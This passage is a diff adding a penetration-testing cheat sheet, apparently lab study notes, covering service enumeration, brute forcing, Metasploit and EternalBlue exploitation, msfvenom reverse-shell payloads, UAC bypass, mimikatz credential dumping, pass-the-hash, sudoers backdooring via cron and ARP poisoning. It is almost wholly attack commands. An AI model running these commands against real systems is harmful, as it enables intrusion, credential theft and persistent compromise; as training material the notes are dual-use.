+nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=&lt;USER&gt;,mssql.password=&lt;PW&gt;,ms-sql-xp-cmdshell.cmd="ipconfig" &lt;TARGET_IP&gt;
+
+nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=&lt;USER&gt;,mssql.password=&lt;PW&gt;,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash"># MYSQL
+mysql -h &lt;TARGET_IP&gt; -u &lt;USER&gt;
+mysql -h &lt;TARGET_IP&gt; -u root
+
+# Mysql client
+help
+show databases;
+use &lt;DB_NAME&gt;;
+select count(*) from &lt;TABLE_NAME&gt;;
+select load_file("/etc/shadow");</code></pre>
+              <h4 id="hydra-3">4.5.2 Hydra</h4>
+              <pre><code class="language-bash">hydra -l &lt;USER&gt; -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;TARGET_IP&gt; mysql</code></pre>
+              <h4 id="metasploit-3">4.5.3 Metasploit</h4>
+              <pre><code class="language-bash">use auxiliary/scanner/mysql/mysql_schemadump
+use auxiliary/scanner/mysql/mysql_writable_dirs
+use auxiliary/scanner/mysql/mysql_file_enum
+use auxiliary/scanner/mysql/mysql_hashdump
+use auxiliary/scanner/mysql/mysql_login
+
+## MS Sql
+use auxiliary/scanner/mssql/mssql_login
+use auxiliary/admin/mssql/mssql_enum
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+use auxiliary/admin/mssql/mssql_exec
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+## set options depends on the selected module
+set USERNAME root
+set PASSWORD ""
+
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE false
+set PASSWORD ""
+
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+set PASSWORD ""
+
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+
+set CMD whoami
+exploit</code></pre>
+              <h3 id="smtp">4.6 SMTP</h3>
+              <h4 id="nmap-5">4.6.1 Nmap</h4>
+              <pre><code class="language-bash">sudo nmap -p 25 -sV -sC -O &lt;TARGET_IP&gt;
+
+nmap -sV -script banner &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">nc &lt;TARGET_IP&gt; 25
+telnet &lt;TARGET_IP&gt; 25
+
+# TELNET client - check supported capabilities
+HELO attacker.xyz
+EHLO attacker.xyz</code></pre>
+              <pre><code class="language-bash">smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="metasploit-4">4.6.2 Metasploit</h4>
+              <pre><code class="language-bash"># METASPLOIT
+service postgresql start &amp;&amp; msfconsole -q
+
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use auxiliary/scanner/smtp/smtp_enum</code></pre>
+              <h2 id="vulnerability-assessment">5. Vulnerability Assessment</h2>
+              <pre><code class="language-bash"># HEARTBLEED
+nmap -sV --script ssl-enum-ciphers -p &lt;SECURED_PORT&gt; &lt;TARGET&gt;
+nmap -sV --script ssl-heartbleed -p 443 &lt;TARGET_IP&gt;
+
+# ETERNALBLUE
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;
+
+# BLUEKEEP
+msfconsole
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+# LOG4J
+nmap --script log4shell.nse --script-args log4shell.callback-server=&lt;CALLBACK_SERVER_IP&gt;:1389 -p 8080 &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">searchsploit badblue 2.7</code></pre>
+              <h2 id="host-based-attacks">6. Host Based Attacks</h2>
+              <h3 id="windows-exploitation">6.1 Windows Exploitation</h3>
+              <h4 id="iis-webdav">6.1.1 IIS WEBDAV</h4>
+              <pre><code class="language-bash"># IIS WEBDAV
+davtest -url &lt;URL&gt;
+davtest -auth &lt;USER&gt;:&lt;PW&gt; -url http://&lt;TARGET_IP&gt;/webdav
+
+cadaver [OPTIONS] &lt;URL&gt;
+
+nmap -p 80 --script http-enum -sV &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">msfvenom -p &lt;PAYLOAD&gt; LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f &lt;file_type&gt; &gt; shell.asp
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f asp &gt; shell.asp</code></pre>
+              <pre><code class="language-bash">hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt &lt;TARGET_IP&gt; http-get /webdav/</code></pre>
+              <pre><code class="language-bash">## METASPLOIT
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/multi/handler
+use exploit/windows/iis/iis_webdav_upload_asp
+
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_HOST_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+
+set HttpUsername &lt;USER&gt;
+set HttpPassword &lt;PW&gt;
+set PATH /webdav/metasploit.asp</code></pre>
+              <h3 id="smb-1">6.2 SMB</h3>
+              <h4 id="nmap-6">6.2.1 Nmap</h4>
+              <pre><code class="language-bash">nmap -p 445 -sV -sC &lt;TARGET_IP&gt;
+
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET_IP&gt;</code></pre>
+              <h4 id="metasploit-5">6.2.2 Metasploit</h4>
+              <pre><code class="language-bash"># Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use auxiliary/scanner/smb/smb_login
+use exploit/windows/smb/psexec
+use exploit/windows/smb/ms17_010_eternalblue
+
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+
+set SMBUser &lt;USER&gt;
+set SMBPass &lt;PW&gt;</code></pre>
+              <pre><code class="language-bash">psexec.py &lt;USER&gt;@&lt;TARGET_IP&gt; cmd.exe</code></pre>
+              <pre><code class="language-bash">## Manual Exploit - AutoBlue
+cd
+mkdir tools
+cd /home/kali/tools
+sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
+cd AutoBlue-MS17-010
+pip install -r requirements.txt
+
+cd shellcode
+chmod +x shell_prep.sh
+./shell_prep.sh
+# LHOST = Host Kali Linux IP
+# LPORT = Port Kali will listen for the reverse shell
+
+nc -nvlp 1234 # On attacker VM
+
+cd ..
+chmod +x eternalblue_exploit7.py
+python eternalblue_exploit7.py &lt;TARGET_IP&gt; shellcode/sc_x64.bin</code></pre>
+              <h4 id="rdp">6.2.3 RDP</h4>
+              <pre><code class="language-bash"># RDP
+nmap -sV &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">## METASPLOIT
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use auxiliary/scanner/rdp/rdp_scanner
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+
+set RPORT &lt;PORT&gt;
+
+# ! Kernel crash may be caused !
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+show targets
+set target &lt;NUMBER&gt;
+set GROOMSIZE 50</code></pre>
+              <pre><code class="language-bash">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://&lt;TARGET_IP&gt; -s &lt;PORT&gt;</code></pre>
+              <pre><code class="language-bash">xfreerdp /u:&lt;USER&gt; /p:&lt;PW&gt; /v:&lt;TARGET_IP&gt;:&lt;PORT&gt;
+
+xfreerdp /u:&lt;USER&gt; /p:&lt;PW&gt; /v:&lt;TARGET_IP&gt;:&lt;PORT&gt; /w:1920 /h:1080 /fonts /smart-sizing</code></pre>
+              <h4 id="winrm">6.2.4 WINRM</h4>
+              <pre><code class="language-bash"># WINRM
+crackmapexec [OPTIONS]
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
+
+nmap --top-ports 7000 &lt;TARGET_IP&gt;
+nmap -sV -p 5985 &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;USER&gt; -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;USER&gt; -p &lt;PW&gt; -x "whoami"
+crackmapexec winrm &lt;TARGET_IP&gt; -u &lt;USER&gt; -p &lt;PW&gt; -x "systeminfo"</code></pre>
+              <pre><code class="language-bash"># Command Shell
+evil-winrm.rb -u &lt;USER&gt; -p '&lt;PW&gt;' -i &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">## METASPLOIT
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/windows/winrm/winrm_script_exec
+
+set USERNAME &lt;USER&gt;
+set PASSWORD &lt;PW&gt;
+set FORCE_VBS true</code></pre>
+              <h3 id="windows-privilege-escalation">6.3 Windows Privilege Escalation</h3>
+              <h4 id="kernel">6.3.1 Kernel</h4>
+              <pre><code class="language-bash"># WIN KERNEL
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe -o payload.exe
+
+python3 -m http.server
+# Download payload.exe on target</code></pre>
+              <pre><code class="language-bash">## Windows-Exploit-Suggester Install
+mkdir Windows-Exploit-Suggester
+cd Windows-Exploit-Suggester
+wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py
+# ^^ This is a python3 version of the script
+
+cd Windows-Exploit-Suggester
+python ./windows-exploit-suggester.py --update
+pip install xlrd --upgrade
+
+./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
+
+./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win2008r2-systeminfo.txt</code></pre>
+              <pre><code class="language-bash">## METASPLOIT
+## Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/multi/handler 
+options
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_HOST_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+
+use post/multi/recon/local_exploit_suggester
+set SESSION &lt;HANDLER_SESSION_NUMBER&gt;
+
+## MsfConsole Meterpreter Privesc
+getprivs
+getsystem
+
+# Exploitable vulnerabilities modules
+exploit/windows/local/bypassuac_dotnet_profiler
+exploit/windows/local/bypassuac_eventvwr
+exploit/windows/local/bypassuac_sdclt
+exploit/windows/local/cve_2019_1458_wizardopium
+exploit/windows/local/cve_2020_1054_drawiconex_lpe
+exploit/windows/local/ms10_092_schelevator
+exploit/windows/local/ms14_058_track_popup_menu
+exploit/windows/local/ms15_051_client_copy_image
+exploit/windows/local/ms16_014_wmi_recv_notif</code></pre>
+              <h4 id="uac">6.3.2 UAC</h4>
+              <pre><code class="language-bash"># UAC - UACME
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe &gt; backdoor.exe
+
+## METASPLOIT - Listening
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_HOST_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+
+## Meterpreter (Unprivileged session)
+cd C:\\
+mkdir Temp
+cd Temp
+upload /root/backdoor.exe
+upload /root/Desktop/tools/UACME/Akagi64.exe
+shell
+Akagi64.exe 23 C:\Temp\backdoor.exe
+
+akagi32.exe [Key] [Param]
+akagi64.exe [Key] [Param]
+
+## Elevated Meterpreter Received on the listening session
+ps -S lsass.exe
+migrate &lt;lsass_PID&gt;
+hashdump</code></pre>
+              <h4 id="access-token">6.3.3 Access Token</h4>
+              <pre><code class="language-bash"># ACCESS TOKEN IMPERSONATION
+
+## METASPLOIT - Meterpreter (Unprivileged session)
+pgrep explorer
+migrate &lt;explorer_PID&gt;
+getuid
+getprivs
+
+load incognito
+list_tokens -u
+impersonate_token "ATTACKDEFENSE\Administrator"
+getuid
+getprivs # Access Denied
+pgrep explorer
+migrate &lt;explorer_PID&gt;
+getprivs
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"</code></pre>
+              <h3 id="windows-credential-dumping">6.4 Windows Credential Dumping</h3>
+              <pre><code class="language-bash"># Exploitation
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=1234 -f exe &gt; payload.exe
+
+python -m SimpleHTTPServer 80
+
+## METASPLOIT
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;LOCAL_HOST_IP&gt;
+set LPORT &lt;LOCAL_PORT&gt;
+run
+
+## On target system
+certutil -urlcache -f http://&lt;TARGET_IP&gt;/payload.exe payload.exe
+# Run payload.exe
+
+# METASPLOIT - Meterpreter
+sysinfo
+getuid
+pgrep lsass
+migrate &lt;explorer_PID&gt;
+getprivs
+
+# Creds dumping - Meterpreter
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+
+# MIMIKATZ
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+
+mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+sekurlsa::logonPasswords
+
+# PASS THE HASH
+## sekurlsa::logonPasswords
+background
+search psexec
+use exploit/windows/smb/psexec
+set LPORT &lt;LOCAL_PORT2&gt;
+set SMBUser Administrator
+set SMBPass &lt;ADMINISTRATOR_LM:NTLM_HASH&gt;
+exploit</code></pre>
+              <pre><code class="language-bash">crackmapexec smb &lt;TARGET_IP&gt; -u Administrator -H "&lt;NTLM_HASH&gt;" -x "whoami"</code></pre>
+              <h3 id="linux-exploitation">6.5 Linux Exploitation</h3>
+              <h4 id="shellshock">6.5.1 Shellshock</h4>
+              <pre><code class="language-bash"># BASH - APACHE
+nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">## METASPLOIT
+# Global set
+setg RHOSTS &lt;TARGET_IP&gt;
+setg RHOST &lt;TARGET_IP&gt;
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS &lt;TARGET_IP&gt;
+set TARGETURI /gettime.cgi
+exploit</code></pre>
+              <h4 id="ftp-1">6.5.2 FTP</h4>
+              <pre><code class="language-bash"># FTP
+ftp &lt;TARGET_IP&gt;
+
+ls -lah /usr/share/nmap/scripts | grep ftp-*
+searchsploit ProFTPD</code></pre>
+              <pre><code class="language-bash">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;TARGET_IP&gt; -t 4 ftp</code></pre>
+              <h4 id="ssh-2">6.5.3 SSH</h4>
+              <pre><code class="language-bash"># SSH
+ssh &lt;USER&gt;@&lt;TARGET_IP&gt;
+
+groups sysadmin
+cat /etc/*release
+uname -r
+cat /etc/passwd
+find / -name "flag"</code></pre>
+              <pre><code class="language-bash">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt &lt;TARGET_IP&gt; -t 4 ssh</code></pre>
+              <h4 id="samba">6.5.4 SAMBA</h4>
+              <pre><code class="language-bash"># SAMBA
+smbmap -u &lt;USER&gt; -p '&lt;PW&gt;' -H &lt;TARGET_IP&gt;
+
+smbclient -L &lt;TARGET_IP&gt; -U &lt;USER&gt;
+
+enum4linux -a &lt;TARGET_IP&gt;
+enum4linux -a -u "&lt;USER&gt;" -p "&lt;PW&gt;" &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash">hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt &lt;TARGET_IP&gt; smb</code></pre>
+              <h3 id="linux-privilege-escalation">6.6 Linux Privilege Escalation</h3>
+              <h4 id="kernel-1">6.6.1 Kernel</h4>
+              <pre><code class="language-bash"># LINUX KERNEL
+## Linux-Exploit-Suggester Install
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh
+
+chmod +x linux-exploit-suggester.sh
+
+./linux-exploit-suggester.sh</code></pre>
+              <h4 id="cron-jobs">6.6.2 Cron Jobs</h4>
+              <pre><code class="language-bash"># CRON
+crontab -l
+
+find / -name &lt;CRONJOB_SCRIPT&gt;
+
+printf '#!/bin/bash\necho "&lt;USER&gt; ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; /usr/local/share/&lt;CRONJOB_SCRIPT&gt;</code></pre>
+              <h4 id="suid">6.6.3 SUID</h4>
+              <pre><code class="language-bash"># SUID
+file &lt;FILE&gt;
+strings &lt;FILE&gt;
+	# find called binary
+rm &lt;BINARY&gt;
+cp /bin/bash &lt;BINARY&gt;
+./&lt;FILE&gt;</code></pre>
+              <h3 id="linux-credential-dumping">6.7 Linux Credential Dumping</h3>
+              <pre><code class="language-bash">cat /etc/passwd
+sudo cat /etc/shadow
+
+# METASPLOIT (once exploited)
+use post/linux/gather/hashdump
+set SESSION &lt;NUMBER&gt;
+
+use auxiliary/analyze/crack_linux
+set SHA512 true</code></pre>
+              <h2 id="network-based-attacks">7. Network Based Attacks</h2>
+              <h3 id="wireshark">7.1 Wireshark</h3>
+              <pre><code class="language-bash">wireshark -i eth1
+
+# Filter by ip
+ip.add == 10.10.10.9
+
+# Filter by dest ip
+ip.dest == 10.10.10.15
+
+# Filter by source ip
+ip.src == 10.10.16.33
+
+# Filter by tcp port
+tcp.port == 25
+
+# Filter by ip addr and port
+ip.addr == 10.10.14.22 and tcp.port == 8080
+
+# Filter SYN flag
+tcp.flags.syn == 1 and tcp.flags.ack ==0
+
+# Broadcast filter
+eth.dst == ff:ff:ff:ff:ff:ff</code></pre>
+              <h3 id="tshark">7.2 TShark</h3>
+              <pre><code class="language-bash">tshark -D
+tshark -i eth1
+tshark -r &lt;FILE&gt;.pcap
+tshark -r &lt;FILE&gt;.pcap | wc -l
+
+# First 100 packets
+tshark -r &lt;FILE&gt;.pcap -c 100
+
+# Protocl hierarchy statistics
+tshark -r &lt;FILE&gt;.pcap -z io,phs -q
+
+# HTTP traffic
+tshark -r &lt;FILE&gt;.pcap -Y 'http' | more
+tshark -r &lt;FILE&gt;.pcap -Y "ip.src==&lt;SOURCE_IP&gt; &amp;&amp; ip.dst==&lt;DEST_IP&gt;"
+
+# Only GET requests
+tshark -r &lt;FILE&gt;.pcap -Y "http.request.method==GET"
+
+# Packets with frame time, source IP and URL for all GET requests
+tshark -r &lt;FILE&gt;.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri
+
+# Packets with a string
+tshark -r &lt;FILE&gt;.pcap -Y "http contains password"
+
+# Check destination IP
+tshark -r &lt;FILE&gt;.pcap -Y "http.request.method==GET &amp;&amp; http.host==&lt;TARGET_URL&gt;" -Tfields -e ip.dst
+
+# Check session ID
+tshark -r &lt;FILE&gt;.pcap -Y "ip contains amazon.in &amp;&amp; ip.src==&lt;IP&gt;" -Tfields -e ip.src -e http.cookie
+
+# Check OS/User Agent type
+tshark -r &lt;FILE&gt;.pcap -Y "ip.src==&lt;IP&gt; &amp;&amp; http" -Tfields -e http.user_agent
+
+# WiFi traffic filter
+tshark -r &lt;FILE&gt;.pcap -Y "wlan"
+
+# Only deauthentication packets 
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.fc.type_subtype==0x000c"
+# and devices
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra
+
+# Only WPA handshake packets
+tshark -r &lt;FILE&gt;.pcap -Y "eapol"
+
+# Onyl SSID/BSSID
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.fc.type_subtype==8" -Tfields -e wlan.ssid -e wlan.bssid
+
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.ssid==&lt;SSID&gt;" -Tfields -e wlan.bssid
+
+# WiFi Channel
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.ssid==&lt;SSID&gt;" -Tfields -e wlan_radio.channel
+
+# Vendor &amp; model
+tshark -r &lt;FILE&gt;.pcap -Y "wlan.ta==&lt;DEVICE_MAC&gt; &amp;&amp; http" -Tfields -e http.user_agent</code></pre>
+              <pre><code class="language-bash"># ARP POISONING - arpspoof
+
+## Forward IP packets
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+# arpspoof -i &lt;interface&gt; -t &lt;target&gt; -r &lt;host&gt;
+arpspoof -i eth1 -t &lt;TARGET_IP&gt; -r &lt;HOST_IP&gt;</code></pre>
+              <h2 id="metasploit-6">8. Metasploit</h2>
+              <pre><code class="language-bash"># MSF Install
+sudo apt update &amp;&amp; sudo apt install metasploit-framework -y
+sudo systemctl enable postgresql
+sudo systemctl restart postgresql
+sudo msfdb init
+
+ls /usr/share/metasploit-framework
+ls ~/.msf4/modules</code></pre>
+              <pre><code class="language-bash">service postgresql start &amp;&amp; msfconsole -q</code></pre>
+              <pre><code class="language-bash"># msfconsole
+db_status
+help
+version
+
+show -h
+show all
+show exploits                     #Aonther way to display exploits
+show payloads                     #display payloads
+
+search &lt;STRING&gt;
+search cve:2017 type:exploit platform:windows
+use &lt;MODULE_NAME&gt;
+show options                      #Check options and required value
+exploit                           #Execution of exploitation
+set &lt;OPTION&gt;
+run
+execute # same as run
+exploit # same as run and execute
+
+sessions
+# Switch between sessions Ids with
+sessions 1
+# Rename sessions
+sessions -n xoda -i 1
+# Run a Meterpreter Command on the session given with `-i`
+sessions -C sysinfo -i 1
+# Terminate a specific session
+sessions -k 1
+# Terminate all sessions
+sessions -K
+# Upgrade a shell session to a Meterpreter session
+sessions -u 1
+
+connect
+
+## Workspaces - db_status must be connected
+workspace
+workspace -a &lt;NEW_WORSKSPACE&gt;
+workspace &lt;WORKSPACE_NAME&gt;
+workspace -d &lt;WORKSPACE_NAME&gt;</code></pre>
+              <pre><code class="language-bash"># Payload Options
+search eternalblue
+use 0
+# ^^ specify the identifier
+set payload &lt;PAYLOAD_NAME&gt;
+set RHOSTS &lt;TARGET_IP&gt;
+run
+# or
+exploit</code></pre>
+              <h3 id="meterpreter">8.1 Meterpreter</h3>
+              <pre><code class="language-bash"># meterpreter &gt; &lt;command&gt;
+
+background    #Switch from a Meterpreter session to the msfconsole command line 
+cat
+cd
+checksum md5 /bin/bash
+clearev
+download Filename /root/****   #Download From victm machine to your machine 
+edit
+execute -f ifconfig
+getenv
+getenv PATH
+getuid
+hashdump
+idletime
+ifconfig
+lpwd
+ls
+migrate
+mkdir
+ps
+pwd
+resource &lt;file.txt&gt;
+rmdir
+search -f *.txt
+shell   #run a standard operating system shell 
+sysinfo   #information about the victm Machine 
+upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine   </code></pre>
+              <h3 id="info-gathering-enumeration">8.2 Info Gathering &amp; Enumeration</h3>
+              <pre><code class="language-bash">workspace -a &lt;hostname_enum&gt;
+# NMAP Export in .XML
+nmap -Pn -sV -O &lt;TARGET_IP&gt; -oX &lt;XML_FILE_NAME&gt;
+
+# msfconsole
+db_import &lt;XML_FILE_NAME&gt;
+
+hosts
+services
+vulns
+loot
+creds
+notes
+
+# Nmap inside MSF
+db_nmap -Pn -sV -O &lt;TARGET_IP&gt;</code></pre>
+              <pre><code class="language-bash"># Port Scan example
+workspace -a Port_scan
+search portscan
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS &lt;TARGET_IP&gt;
+set PORTS 1-1000
+run
+
+# Exploitation
+search xoda
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS &lt;TARGET_IP&gt;
+set TARGETURI /
+run
+
+# Pivoting to TARGET2 through TARGET1
+run autoroute -s &lt;TARGET1_SUBNET_NETWORK&gt;
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS &lt;TARGET2_IP&gt;
+run</code></pre>
+              <pre><code class="language-bash"># UDP Scan
+search udp_sweep
+use auxiliary/scanner/discovery/udp_sweep
+set RHOSTS &lt;TARGET_IP&gt;
+run</code></pre>
+              <pre><code class="language-bash"># Service Enumeration
+
+# FTP
+use auxiliary/scanner/ftp/ftp_version
+use auxiliary/scanner/ftp/ftp_login
+use auxiliary/scanner/ftp/anonymous
+
+# SMB
+use auxiliary/scanner/ftp/anonymous
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/smb_login
+
+# HTTP
+use auxiliary/scanner/http/apache_userdir_enum
+use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/dir_scanner
+use auxiliary/scanner/http/dir_listing
+use auxiliary/scanner/http/http_put
+use auxiliary/scanner/http/files_dir
+use auxiliary/scanner/http/http_login
+use auxiliary/scanner/http/http_header
+use auxiliary/scanner/http/http_version
+use auxiliary/scanner/http/robots_txt
+
+# MYSQL
+use auxiliary/admin/mysql/mysql_enum
+use auxiliary/admin/mysql/mysql_sql
+use auxiliary/scanner/mysql/mysql_file_enum
+use auxiliary/scanner/mysql/mysql_hashdump
+use auxiliary/scanner/mysql/mysql_login
+use auxiliary/scanner/mysql/mysql_schemadump
+use auxiliary/scanner/mysql/mysql_version
+use auxiliary/scanner/mysql/mysql_writable_dirs
+
+# SSH
+use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ssh/ssh_login
+use auxiliary/scanner/ssh/ssh_enumusers
+
+# SMTP
+use auxiliary/scanner/smtp/smtp_enum
+use auxiliary/scanner/smtp/smtp_version</code></pre>
+              <h3 id="vulnerability-scanning">8.3 Vulnerability Scanning</h3>
+              <pre><code class="language-bash"># NMAP
+db_nmap -sS -sV -O &lt;TARGET_IP&gt;
+
+search type:exploit name:iis
+search &lt;SERVICE_NAME_VERSION&gt;
+
+# e.g.
+search eternalblue
+use auxiliary/scanner/smb/smb_ms17_010</code></pre>
+              <pre><code class="language-bash"># Kali Linux terminal
+searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"</code></pre>
+              <pre><code class="language-bash"># Metasploit Autopwn
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
+
+# msfconsole
+load db_autopwn
+
+# Enumerates exploits for each of the open ports
+db_autopwn -p -t
+# Limit to only the 445 port
+db_autopwn -p -t -PI 445</code></pre>
+              <pre><code class="language-bash"># msfconsole
+analyze
+vulns</code></pre>
+              <pre><code class="language-bash"># NESSUS Results Import
+db_import /home/kali/Downloads/MS3_zph3t5.nessus
+hosts
+services
+vulns
+vulns -p 445
+
+search cve:2017 name:smb
+search MS12-020
+search cve:2019 name:rdp
+search cve:2015 name:ManageEngine
+search PHP CGI Argument Injection</code></pre>
+              <pre><code class="language-bash"># WMAP in msfconsole
+load wmap
+wmap_sites -a &lt;TARGET_IP&gt;
+wmap_sites -l
+wmap_targets -t &lt;URL&gt;
+wmap_targets -l
+
+wmap_run -t
+wmap_run -e
+wmap_vulns -l
+
+# msfconsole
+use auxiliary/scanner/http/http_put</code></pre>
+              <h3 id="payloads">8.4 Payloads</h3>
+              <h4 id="msfvenom-shells">8.4.1 MSFVenom shells</h4>
+              <pre><code class="language-bash">msfvenom --list payloads
+msfvenom --list formats
+msfvenom --list encoders
+
+# Win 32bit
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe &gt; &lt;PAYLOAD_FILE_x86&gt;.exe
+
+# Win 64bit
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe &gt; &lt;PAYLOAD_FILE_x64&gt;.exe
+
+# Linux 32bit
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f elf &gt; &lt;PAYLOAD_FILE_x86&gt;
+
+# Linux 64bit
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f elf &gt; &lt;PAYLOAD_FILE_x64&gt;
+
+# Win 32bit + shikata_ga_nai encoded
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LOCAL_HOST_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -e x86/shikata_ga_nai -f exe &gt; &lt;PAYLOAD_ENCODED_x86&gt;.exe
+
+# Use more encoding iterations
